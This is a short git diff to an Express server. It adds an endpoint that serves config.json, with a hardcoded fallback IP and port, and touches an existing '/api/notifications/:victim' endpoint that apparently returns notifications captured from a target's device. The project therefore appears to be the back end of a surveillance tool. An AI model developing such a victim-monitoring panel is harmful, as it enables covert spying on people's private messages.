@@ -35,6 +35,34 @@ app.use(express.static(publicDir));
 app.use('/dist', express.static(path.join(publicDir, 'dist')));
 
 // ————————————————————————————————————————————————————————————————
+// ENDPOINT PARA CONFIGURACIÓN DINÁMICA
+// ————————————————————————————————————————————————————————————————
+app.get('/api/config', (req, res) => {
+  const configPath = path.join(__dirname, 'config.json');
+  fs.readFile(configPath, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Error reading config.json:', err);
+      return res.status(500).json({ 
+        error: 'Configuration file not found',
+        SERVER_IP: '192.168.1.68',
+        SERVER_PORT: 8000
+      });
+    }
+    try {
+      const config = JSON.parse(data);
+      res.json(config);
+    } catch(e) {
+      console.error('Error parsing config.json:', e);
+      res.status(500).json({ 
+        error: 'Invalid configuration format',
+        SERVER_IP: '192.168.1.68',
+        SERVER_PORT: 8000
+      });
+    }
+  });
+});
+
+// ————————————————————————————————————————————————————————————————
 // ENDPOINT PARA NOTIFICACIONES (nuevo)
 // ————————————————————————————————————————————————————————————————
 app.get('/api/notifications/:victim', (req, res) => {
@@ -48,7 +76,7 @@ app.get('/api/notifications/:victim', (req, res) => {
     const notifications = lines.map(line => {
       try {
         return JSON.parse(line);
-      } catch(e) {
+      } catch(parseError) {
         return {
           app: "Desconocida",
           content: line,
